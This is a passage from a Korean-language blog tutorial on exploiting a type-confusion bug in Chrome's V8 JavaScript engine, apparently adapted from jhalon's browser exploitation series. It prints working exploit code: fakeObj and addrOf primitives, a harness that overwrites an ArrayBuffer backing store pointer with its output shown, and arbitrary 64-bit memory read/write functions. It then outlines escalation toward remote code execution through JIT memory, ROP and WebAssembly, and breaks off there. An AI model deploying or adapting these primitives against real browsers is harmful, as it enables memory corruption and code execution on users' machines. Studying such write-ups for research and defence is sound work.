<code>p2</code>&#xC758; &#xAC1D;&#xCCB4; &#xC8FC;&#xC18C;&#xB97C; &#xC5ED;&#xCC38;&#xC870;&#xD558;&#xC5EC; &#xC624;&#xD504;&#xC14B; 24&#xB97C; &#xC811;&#xADFC;&#xD558;&#xAC8C; &#xB418;&#xACE0;, &#xADF8; &#xC704;&#xCE58;&#xC5D0; &#xC778;&#xB77C;&#xC778;&#xC73C;&#xB85C; &#xC800;&#xC7A5;&#xB41C; <code>y</code> &#xD504;&#xB85C;&#xD37C;&#xD2F0; &#xAC12;&#xC744; &#xC870;&#xC791;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xACB0;&#xACFC;&#xC801;&#xC73C;&#xB85C; &#xC6B0;&#xB9AC;&#xB294; <code>obj</code> &#xAC1D;&#xCCB4;&#xC758; &#xC8FC;&#xC18C;&#xB97C; &#xB36E;&#xC5B4;&#xC4F8; &#xC218; &#xC788;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC544;&#xB798; &#xADF8;&#xB9BC;&#xC740; &#xC774;&#xB97C; &#xC2DC;&#xAC01;&#xC801;&#xC73C;&#xB85C; &#xB098;&#xD0C0;&#xB0B8; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="image.png" alt="&#xCD9C;&#xCC98;: [https://jhalon.github.io/chrome-browser-exploitation-3/](https://jhalon.github.io/chrome-browser-exploitation-3/)"></p><p>&#xCD9C;&#xCC98;: <a href="https://jhalon.github.io/chrome-browser-exploitation-3/">https://jhalon.github.io/chrome-browser-exploitation-3/</a></p><p>ArrayBuffer&#xC758; &#xBC31;&#xD0B9; &#xC2A4;&#xD1A0;&#xC5B4; &#xD3EC;&#xC778;&#xD130;&#xB294; &#xC624;&#xD504;&#xC14B; 32&#xC5D0; &#xC704;&#xCE58;&#xD569;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; <code>x2</code>&#xC640; &#xAC19;&#xC740; &#xB610; &#xB2E4;&#xB978; &#xC778;&#xB77C;&#xC778; &#xD504;&#xB85C;&#xD37C;&#xD2F0;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xBA74;, <code>fakeObj</code> &#xD504;&#xB9AC;&#xBBF8;&#xD2F0;&#xBE0C;&#xB97C; &#xD1B5;&#xD574; &#xD574;&#xB2F9; &#xBC31;&#xD0B9; &#xC2A4;&#xD1A0;&#xC5B4; &#xD3EC;&#xC778;&#xD130;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xACE0; &#xC774;&#xB97C; &#xB36E;&#xC5B4;&#xC4F8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB2E4;&#xC74C;&#xC758; &#xADF8;&#xB9BC;&#xC744; &#xBD05;&#xC2DC;&#xB2E4;.</p><p><img src="image%201.png" alt="image.png"></p><p>&#xC774;&#xC81C; ArrayBuffer&#xC758; Backing Store Pointer&#xB97C; &#xB36E;&#xC5B4;&#xC500;&#xC73C;&#xB85C;&#xC368; AAR/W primitive&#xB97C; &#xD68D;&#xB4DD;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xC5EC;&#xAE30;&#xC11C; &#xC57D;&#xAC04;&#xC758; &#xBB38;&#xC81C;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xAC00;&#xB839;, &#xC5EC;&#xB7EC; &#xBA54;&#xBAA8;&#xB9AC; &#xC704;&#xCE58;&#xC5D0;&#xC11C; &#xC77D;&#xAE30; &#xBC0F; &#xC4F0;&#xAE30;&#xB97C; &#xD574;&#xC57C; &#xD55C;&#xB2E4;&#xACE0; &#xAC00;&#xC815;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;. &#xC774; &#xACBD;&#xC6B0; &#xC6B0;&#xB9AC;&#xB294; &#xACC4;&#xC18D;&#xD574;&#xC11C; &#xBC84;&#xADF8;&#xB97C; &#xD2B8;&#xB9AC;&#xAC70;&#xD558;&#xACE0; <code>fakeObj</code> &#xD504;&#xB9AC;&#xBBF8;&#xD2F0;&#xBE0C;&#xB97C; &#xD1B5;&#xD574; &#xBC30;&#xC5F4; &#xBC84;&#xD37C;&#xC758; &#xBC31;&#xD0B9; &#xC2A4;&#xD1A0;&#xC5B4;&#xB97C; &#xB36E;&#xC5B4;&#xC368;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB294; &#xB9E4;&#xC6B0; &#xBC88;&#xAC70;&#xB85C;&#xC6B4; &#xACFC;&#xC815;&#xC774;&#xBBC0;&#xB85C; &#xC880; &#xB354; &#xC720;&#xC6A9;&#xD55C; &#xAE30;&#xBC95;&#xC774; &#xD544;&#xC694;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB97C; &#xC704;&#xD574;, Array Buffer &#xAC1D;&#xCCB4;&#xB97C; &#xD558;&#xB098;&#xAC00; &#xC544;&#xB2CC; <strong>&#xB450; &#xAC1C;</strong>&#xB97C; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBA3C;&#xC800; &#xCCAB; &#xBC88;&#xC9F8; Array Buffer&#xC758; &#xBC31;&#xD0B9; &#xC2A4;&#xD1A0;&#xC5B4; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xC190;&#xC0C1;&#xC2DC;&#xCF1C; &#xB450; &#xBC88;&#xC9F8; &#xBC30;&#xC5F4; &#xBC84;&#xD37C; &#xAC1D;&#xCCB4;&#xC758; &#xC8FC;&#xC18C;&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xB3C4;&#xB85D; &#xB9CC;&#xB4ED;&#xB2C8;&#xB2E4;. &#xADF8; &#xB2E4;&#xC74C;, &#xCCAB; &#xBC88;&#xC9F8; Array Buffer&#xC758; <code>TypedArray</code> view&#xB97C; &#xC774;&#xC6A9;&#xD574; &#xB2E4;&#xC12F; &#xBC88;&#xC9F8; &#xAC1D;&#xCCB4; &#xD504;&#xB85C;&#xD37C;&#xD2F0;(&#xB124; &#xBC88;&#xC9F8; &#xC778;&#xB371;&#xC2A4;, &#xC989; <code>view1[4]</code>)&#xC5D0; &#xAC12;&#xC744; &#xC368;&#xC90D;&#xB2C8;&#xB2E4;. &#xC774; &#xACFC;&#xC815;&#xC740; &#xB450; &#xBC88;&#xC9F8; &#xBC30;&#xC5F4; &#xBC84;&#xD37C;&#xC758; &#xBC31;&#xD0B9; &#xC2A4;&#xD1A0;&#xC5B4; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xB36E;&#xC5B4;&#xC50C;&#xC6B0;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; &#xB450; &#xBC88;&#xC9F8; &#xBC30;&#xC5F4; &#xBC84;&#xD37C;&#xC758; <code>TypedArray</code> view&#xB97C; &#xC774;&#xC6A9;&#xD558;&#xBA74; &#xC6D0;&#xD558;&#xB294; &#xBA54;&#xBAA8;&#xB9AC; &#xC601;&#xC5ED;&#xC5D0; &#xC790;&#xC720;&#xB86D;&#xAC8C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC77D;&#xAC70;&#xB098; &#xC4F8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xC640; &#xAC19;&#xC774; &#xB450; &#xAC1C;&#xC758; &#xBC30;&#xC5F4; &#xBC84;&#xD37C;&#xB97C; &#xD568;&#xAED8; &#xC0AC;&#xC6A9;&#xD558;&#xBA74;, V8 &#xD799; &#xB0B4; &#xC784;&#xC758;&#xC758; &#xC704;&#xCE58;&#xC5D0; &#xB300;&#xD574; &#xBE60;&#xB974;&#xAC8C; &#xC77D;&#xACE0; &#xC4F8; &#xC218; &#xC788;&#xB294; &#xB610; &#xB2E4;&#xB978; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787; &#xD504;&#xB9AC;&#xBBF8;&#xD2F0;&#xBE0C;&#xB97C; &#xB9CC;&#xB4E4; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC544;&#xB798; &#xC608;&#xC2DC;&#xB294; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0;&#xC11C; &#xC774; &#xAD6C;&#xC870;&#xB97C; &#xC124;&#xBA85;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="image%202.png" alt="image.png"></p><h3 id="Coding"><a href="#Coding" class="headerlink" title="Coding)"></a>Coding)</h3><p>&#xCF54;&#xB4DC; &#xBD80;&#xBD84;&#xC744; &#xBD05;&#xC2DC;&#xB2E4;. &#xC55E;&#xC5D0;&#xC11C;&#xB294; &#xB36E;&#xC5B4;&#xC4F0;&#xB294; &#xAC12;&#xC744; &#xD558;&#xB4DC;&#xCF54;&#xB529;&#xD588;&#xB294;&#xB370;, &#xC774;&#xC81C;&#xB294; &#xC804;&#xB2EC; &#xBC1B;&#xC740; &#xC778;&#xC790;&#xB85C; &#xAC12;&#xC744; &#xC4F0;&#xB3C4;&#xB85D; &#xC218;&#xC815;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C;, <code>p1</code> &#xAC1D;&#xCCB4;&#xB97C; &#xB450; &#xAC1C;&#xC758; &#xC778;&#xB77C;&#xC778; &#xD504;&#xB85C;&#xD37C;&#xD2F0;&#xB97C; &#xAC00;&#xC9C4; &#xD615;&#xD0DC;&#xB85C; &#xC218;&#xC815;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xADF8; &#xC774;&#xC720;&#xB294; &#xB450; &#xBC88;&#xC9F8; &#xC778;&#xB77C;&#xC778; &#xD504;&#xB85C;&#xD37C;&#xD2F0;&#xAC00; &#xBC30;&#xC5F4; &#xBC84;&#xD37C;&#xC758; &#xBC31;&#xD0B9; &#xC2A4;&#xD1A0;&#xC5B4; &#xD3EC;&#xC778;&#xD130;&#xC640; &#xACB9;&#xCE58;&#xAE30; &#xB54C;&#xBB38;&#xC785;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; <code>vuln</code> &#xD568;&#xC218; &#xC5ED;&#xC2DC; &#xB450; &#xBC88;&#xC9F8; &#xC778;&#xB77C;&#xC778; &#xD504;&#xB85C;&#xD37C;&#xD2F0;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xC5EC; &#xBC31;&#xD0B9; &#xC2A4;&#xD1A0;&#xC5B4; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xB36E;&#xC5B4;&#xC4F8; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xC218;&#xC815;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB9AC;&#xACE0; &#xC8FC;&#xC18C;&#xB098; &#xB370;&#xC774;&#xD130;&#xB97C; float &#xD0C0;&#xC785;&#xC73C;&#xB85C; &#xBC14;&#xAFB8;&#xAE30; &#xC704;&#xD574;&#xC11C; toNumber &#xD568;&#xC218;&#xB97C; &#xCD94;&#xAC00;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB294; Type Confusion &#xC2DC; &#xBD80;&#xB3D9;&#xC18C;&#xC218;&#xAC12;&#xC744; &#xC8FC;&#xC18C;&#xAC12;&#xC73C;&#xB85C; &#xD574;&#xC11D;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xCD5C;&#xC885;&#xC801;&#xC73C;&#xB85C; &#xC644;&#xC131;&#xB41C; <code>fakeObj</code> &#xD504;&#xB9AC;&#xBBF8;&#xD2F0;&#xBE0C;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx">BigInt.prototype.toNumber = <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">toNumber</span>(<span class="hljs-params"></span>) </span>{    uint64View[<span class="hljs-number">0</span>] = <span class="hljs-built_in">this</span>;    <span class="hljs-keyword">return</span> floatView[<span class="hljs-number">0</span>];};<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fakeObj</span>(<span class="hljs-params">obj, newValue</span>) </span>{    <span class="hljs-built_in">eval</span>(<span class="hljs-string">`</span><span class="hljs-string">    function vuln(obj) {</span><span class="hljs-string">      obj.inline;</span><span class="hljs-string">      this.Object.create(obj);</span><span class="hljs-string">      // Write to Backing Store Pointer via Property x2</span><span class="hljs-string">      let orig = obj.p<span class="hljs-subst">${p1}</span>.x2;</span><span class="hljs-string">      obj.p<span class="hljs-subst">${p1}</span>.x2 = <span class="hljs-subst">${newValue.toNumber()}</span>;</span><span class="hljs-string">      return orig;</span><span class="hljs-string">    }</span><span class="hljs-string">  `</span>);    <span class="hljs-keyword">let</span> pValues = [];    <span class="hljs-comment">// x2 Property Overlaps Backing Store Pointer for Array Buffer</span>    <span class="hljs-keyword">let</span> o = {<span class="hljs-attr">x1</span>: <span class="hljs-number">13.37</span>, <span class="hljs-attr">x2</span>: <span class="hljs-number">13.38</span>};    pValues[p1] = o;    pValues[p2] = obj;    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {        <span class="hljs-comment">// Force Map Check and Redundancy Elimination</span>        o.x2 = <span class="hljs-number">13.38</span>;        <span class="hljs-keyword">let</span> res = vuln(makeObj(pValues));        <span class="hljs-keyword">if</span> (res != <span class="hljs-number">13.38</span>) {            <span class="hljs-keyword">return</span> res.toBigInt();        }    }    <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;[!] fakeObj Primitive Failed&quot;</span>}</code></pre><p>&#xC774;&#xC81C; <code>fakeObj</code> &#xD504;&#xB9AC;&#xBBF8;&#xD2F0;&#xBE0C;&#xC5D0;&#xC11C; &#xB450; &#xAC1C;&#xC758; &#xC778;&#xB77C;&#xC778; &#xD504;&#xB85C;&#xD37C;&#xD2F0;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xC774;&#xC720;&#xC640; &#xB3D9;&#xC77C;&#xD558;&#xAC8C; <code>addrOf</code> &#xD504;&#xB9AC;&#xBBF8;&#xD2F0;&#xBE0C; &#xC5ED;&#xC2DC; &#xC218;&#xC815;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xC218;&#xC815;&#xB41C; &#xCF54;&#xB4DC;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">addrOf</span>(<span class="hljs-params">obj</span>) </span>{    <span class="hljs-built_in">eval</span>(<span class="hljs-string">`</span><span class="hljs-string">    function vuln(obj) {</span><span class="hljs-string">      obj.inline;</span><span class="hljs-string">      this.Object.create(obj);</span><span class="hljs-string">      // Trigger our type-confusion by accessing an out-of-bound property</span><span class="hljs-string">      // This will load p1 from our object thinking it&apos;s a Double, but instead</span><span class="hljs-string">      // due to overlap, it will load p2 which is an Object</span><span class="hljs-string">      return obj.p<span class="hljs-subst">${p1}</span>.x2;</span><span class="hljs-string">    }</span><span class="hljs-string">  `</span>);    <span class="hljs-keyword">let</span> pValues = [];    <span class="hljs-comment">// x2 Property Overlaps Backing Store Pointer for Array Buffer</span>    pValues[p1] = {<span class="hljs-attr">x1</span>: <span class="hljs-number">13.37</span>, <span class="hljs-attr">x2</span>: <span class="hljs-number">13.38</span>};    pValues[p2] = {<span class="hljs-attr">y</span>: obj};    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {        <span class="hljs-keyword">let</span> res = vuln(makeObj(pValues));        <span class="hljs-keyword">if</span> (res != <span class="hljs-number">13.37</span>) {            <span class="hljs-comment">// Subtract 1n from address due to pointer tagging.</span>            <span class="hljs-keyword">return</span> res.toBigInt() - <span class="hljs-number">1n</span>;        }    }    <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;[!] AddrOf Primitive Failed&quot;</span>}</code></pre><hr><p>&#xC774;&#xC81C; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC218;&#xC815;&#xD588;&#xC73C;&#xBBC0;&#xB85C;, &#xBC30;&#xC5F4; &#xBC84;&#xD37C;&#xC758; &#xBC31;&#xD0B9; &#xC2A4;&#xD1A0;&#xC5B4; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xB36E;&#xC5B4;&#xC4F8; &#xC218; &#xC788;&#xC5B4;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xD14C;&#xC2A4;&#xD2B8;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC6B0;&#xC120; 1024&#xBC14;&#xC774;&#xD2B8; &#xD06C;&#xAE30;&#xC758; &#xC0C8;&#xB85C;&#xC6B4; &#xBC30;&#xC5F4; &#xBC84;&#xD37C;&#xB97C; &#xB9CC;&#xB4E4;&#xACE0;, &#xADF8; &#xC8FC;&#xC18C;&#xB97C; leak&#xD55C; &#xB4A4; &#xBC31;&#xD0B9; &#xC2A4;&#xD1A0;&#xC5B4; &#xD3EC;&#xC778;&#xD130;&#xB97C; <code>0x41414141</code>&#xB85C; &#xB36E;&#xC5B4;&#xC50C;&#xC6CC; &#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCF54;&#xB4DC; &#xB0B4;&#xC5D0; <code>%DebugPrint</code>&#xB97C; &#xCD94;&#xAC00;&#xD558;&#xC5EC; &#xC720;&#xCD9C;&#xB41C; &#xC8FC;&#xC18C;&#xAC00; &#xC2E4;&#xC81C; &#xBC30;&#xC5F4; &#xBC84;&#xD37C; &#xAC1D;&#xCCB4;&#xC758; &#xC8FC;&#xC18C;&#xC640; &#xC77C;&#xCE58;&#xD558;&#xB294;&#xC9C0;, &#xADF8;&#xB9AC;&#xACE0; &#xBC31;&#xD0B9; &#xC2A4;&#xD1A0;&#xC5B4; &#xD3EC;&#xC778;&#xD130;&#xAC00; &#xC131;&#xACF5;&#xC801;&#xC73C;&#xB85C; &#xB36E;&#xC5B4;&#xC368;&#xC84C;&#xB294;&#xC9C0;&#xB97C; &#xAC80;&#xC99D;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC218;&#xC815;&#xB41C; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xC758; &#xB9C8;&#xC9C0;&#xB9C9; &#xBD80;&#xBD84;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx">print(<span class="hljs-string">&quot;[+] Finding Overlapping Properties...&quot;</span>);findOverlappingProperties();print(<span class="hljs-string">`[+] Properties p<span class="hljs-subst">${p1}</span> and p<span class="hljs-subst">${p2}</span> overlap!`</span>);<span class="hljs-comment">// Create Array Buffer</span><span class="hljs-keyword">let</span> arrBuf1 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayBuffer</span>(<span class="hljs-number">1024</span>);print(<span class="hljs-string">&quot;[+] Leaking ArrayBuffer Address...&quot;</span>);<span class="hljs-keyword">let</span> arrBuf1fAddr = addrOf(arrBuf1);print(<span class="hljs-string">`[+] ArrayBuffer Address: 0x<span class="hljs-subst">${arrBuf1fAddr.toString(<span class="hljs-number">16</span>)}</span>`</span>);%DebugPrint(arrBuf1)print(<span class="hljs-string">&quot;[+] Corrupting ArrayBuffer Backing Store Address...&quot;</span>)<span class="hljs-comment">// Overwrite Backing Store Pointer with 0x41414141</span><span class="hljs-keyword">let</span> ret = fakeObj(arrBuf1, <span class="hljs-number">0x41414141n</span>);print(<span class="hljs-string">`[+] Original Leaked Data: 0x<span class="hljs-subst">${ret.toString(<span class="hljs-number">16</span>)}</span>`</span>);%DebugPrint(arrBuf1)</code></pre><p>&#xC2E4;&#xD589; &#xACB0;&#xACFC;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs prolog">[+] <span class="hljs-symbol">Finding</span> <span class="hljs-symbol">Overlapping</span> <span class="hljs-symbol">Properties</span>...[+] <span class="hljs-symbol">Properties</span> p15 and p11 overlap![+] <span class="hljs-symbol">Leaking</span> <span class="hljs-symbol">ArrayBuffer</span> <span class="hljs-symbol">Address</span>...[+] <span class="hljs-symbol">ArrayBuffer</span> <span class="hljs-symbol">Address</span>: <span class="hljs-number">0x2a164919360</span>...[+] <span class="hljs-symbol">Corrupting</span> <span class="hljs-symbol">ArrayBuffer</span> <span class="hljs-symbol">Backing</span> <span class="hljs-symbol">Store</span> <span class="hljs-symbol">Address</span>...[+] <span class="hljs-symbol">Original</span> <span class="hljs-symbol">Leaked</span> <span class="hljs-symbol">Data</span>: <span class="hljs-number">0x1aeda203210</span><span class="hljs-symbol">DebugPrint</span>: ... - backing_store: <span class="hljs-number">0000000041414141</span>...</code></pre><hr><p>&#xC774;&#xC81C; &#xBC31;&#xD0B9; &#xC2A4;&#xD1A0;&#xC5B4; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xB36E;&#xC5B4;&#xC4F8; &#xC218; &#xC788;&#xC73C;&#xBBC0;&#xB85C;, &#xB450; &#xAC1C;&#xC758; ArrayBuffer&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xBA54;&#xBAA8;&#xB9AC; &#xC77D;&#xAE30;/&#xC4F0;&#xAE30; &#xD504;&#xB9AC;&#xBBF8;&#xD2F0;&#xBE0C;&#xB97C; &#xAD6C;&#xCD95;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><pre><code class="hljs jsx"><span class="hljs-keyword">let</span> memory = {    read64(addr) {        view1[<span class="hljs-number">4</span>] = addr;        <span class="hljs-keyword">let</span> view2 = <span class="hljs-keyword">new</span> BigUint64Array(arrBuf2);        <span class="hljs-keyword">return</span> view2[<span class="hljs-number">0</span>];    },    write64(addr, ptr) {        view1[<span class="hljs-number">4</span>] = addr;        <span class="hljs-keyword">let</span> view2 = <span class="hljs-keyword">new</span> BigUint64Array(arrBuf2);        view2[<span class="hljs-number">0</span>] = ptr;    }};</code></pre><p>Type Confusion&#xC744; &#xC774;&#xC6A9;&#xD574;&#xC11C; &#xCC98;&#xC74C;&#xC5D0;&#xB294; Overlapping &#xB418;&#xB294; bug&#xB97C; &#xC774;&#xC6A9;&#xD574; Relative R/W&#xB97C; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xC5C8;&#xACE0; Array Buffer 2&#xAC1C;&#xB97C; &#xC774;&#xC6A9;&#xD574; &#xC774;&#xB97C; Arbitary Address R/W&#xB85C; &#xBC14;&#xAFC0; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xC81C; Code&#xB97C; Execution &#xD558;&#xB7EC; &#xAC00;&#xBCF4;&#xC2DC;&#xC8E0;!</p><h2 id="1-2-AAR-W-&#x2192;-RCE"><a href="#1-2-AAR-W-&#x2192;-RCE" class="headerlink" title="1.2 AAR/W &#x2192; RCE"></a>1.2 AAR/W &#x2192; RCE</h2><h3 id="Toward-Gaining-Code-Execution"><a href="#Toward-Gaining-Code-Execution" class="headerlink" title="Toward Gaining Code Execution"></a>Toward Gaining Code Execution</h3><p>AAR/W&#xB97C; &#xC5BB;&#xC5C8;&#xC73C;&#xB2C8; &#xC774;&#xC81C; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xC2DC;&#xD0A4;&#xBA74; &#xB418;&#xB294;&#xB370;, &#xC548;&#xD0C0;&#xAE5D;&#xAC8C;&#xB3C4;.. &#xB2E8;&#xC21C;&#xD788; V8 &#xD799; &#xC601;&#xC5ED;&#xC774;&#xB098; ArrayBuffer&#xC5D0; &#xC178;&#xCF54;&#xB4DC;&#xB97C; &#xC368; &#xB123;&#xACE0; &#xC2E4;&#xD589;&#xD560; &#xC218;&#xB294; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC65C;&#xB0D0;&#xD558;&#xBA74; DEP(Data Execution Prevention)&#xAC00; &#xD65C;&#xC131;&#xD654;&#xB418;&#xC5B4; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC785;&#xB2C8;&#xB2E4;. &#xADF8;&#xB798;&#xC11C; &#xB300;&#xC548;&#xC73C;&#xB85C;&#xB294; JIT &#xBA54;&#xBAA8;&#xB9AC; &#xC601;&#xC5ED;&#xC744; &#xBAA9;&#xD45C;&#xB85C; &#xC0BC;&#xB294; &#xBC29;&#xBC95;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xC790;&#xBC14;&#xC2A4;&#xD06C;&#xB9BD;&#xD2B8; &#xCF54;&#xB4DC;&#xAC00; JIT &#xCEF4;&#xD30C;&#xC77C;&#xB420; &#xB54C;, &#xCEF4;&#xD30C;&#xC77C;&#xB7EC;&#xB294; &#xAE30;&#xACC4;&#xC5B4; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xBA54;&#xBAA8;&#xB9AC; &#xD398;&#xC774;&#xC9C0;&#xC5D0; &#xAE30;&#xB85D;&#xD558;&#xACE0; &#xC774;&#xB97C; &#xC2E4;&#xD589;&#xD574;&#xC57C; &#xD558;&#xBBC0;&#xB85C; &#xBCF4;&#xD1B5; &#xD574;&#xB2F9; &#xBA54;&#xBAA8;&#xB9AC; &#xD398;&#xC774;&#xC9C0;&#xC5D0;&#xB294; RWX(Read-Write-Execute) &#xAD8C;&#xD55C;&#xC774; &#xBD80;&#xC5EC;&#xB429;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xACF5;&#xACA9;&#xC790;&#xB294; JIT &#xCEF4;&#xD30C;&#xC77C;&#xB41C; &#xD568;&#xC218;&#xC758; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xC720;&#xCD9C;&#xD55C; &#xB4A4;, &#xD574;&#xB2F9; &#xC8FC;&#xC18C;&#xC5D0; &#xC178;&#xCF54;&#xB4DC;&#xB97C; &#xB36E;&#xC5B4;&#xC4F0;&#xACE0; &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xC5EC; &#xC545;&#xC131; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><em>&#xADF8;&#xB7EC;&#xB098;</em> 2018&#xB144; &#xC774;&#xD6C4; V8 &#xD300;&#xC740; <code>write_protect_code_memory</code> &#xBCF4;&#xD638; &#xAE30;&#xBC95;&#xC744; &#xB3C4;&#xC785;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xAE30;&#xB2A5;&#xC740; JIT &#xBA54;&#xBAA8;&#xB9AC; &#xD398;&#xC774;&#xC9C0;&#xC758; &#xAD8C;&#xD55C;&#xC744; &#xC2E4;&#xD589; &#xC2DC;&#xC810;&#xC5D0;&#xB294; RX(Read-Execute) &#xB85C;, &#xC4F0;&#xAE30; &#xC2DC;&#xC810;&#xC5D0;&#xB294; RW(Read-Write) &#xB85C; &#xC804;&#xD658;&#xD569;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xB2E8;&#xC21C;&#xD788; RWX &#xBA54;&#xBAA8;&#xB9AC;&#xB85C; &#xCDE8;&#xAE09;&#xD558;&#xACE0; &#xACF5;&#xACA9;&#xD558;&#xB294; &#xAC83;&#xC774; &#xBD88;&#xAC00;&#xB2A5;&#xD574;&#xC84C;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xB2E4;&#xB978; pwnable &#xBB38;&#xC81C;&#xCC98;&#xB7FC; &#xC774;&#xB97C; &#xC6B0;&#xD68C;&#xD558;&#xB294; &#xB300;&#xD45C;&#xC801;&#xC778; &#xBC29;&#xBC95;&#xC740; ROP(Return Oriented Programming) &#xAE30;&#xBC95;&#xC744; &#xBF51;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. ROP&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xAC00;&#xC0C1; &#xD568;&#xC218; &#xD14C;&#xC774;&#xBE14;(vtable)&#xC774;&#xB098; JIT &#xD568;&#xC218; &#xD3EC;&#xC778;&#xD130;, &#xC2A4;&#xD0DD;&#xC744; &#xC870;&#xC791;&#xD558;&#xC5EC; Code Execution&#xC744; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>ROP &#xCCB4;&#xC778;&#xC744; &#xAD6C;&#xC131;&#xD558;&#xB294; &#xAC83;&#xC740; &#xC0C1;&#xB2F9;&#xD788; &#xBCF5;&#xC7A1;&#xD55C; &#xC791;&#xC5C5;&#xC785;&#xB2C8;&#xB2E4;. &#xADF8;&#xB807;&#xAE30;&#xC5D0; &#xC880; &#xB354; &#xB2E8;&#xC21C;&#xD558;&#xACE0; &#xD6A8;&#xC728;&#xC801;&#xC778; <strong>WebAssembly (wasm)</strong>&#xB97C; &#xD1B5;&#xD574; exploit&#xC744; &#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 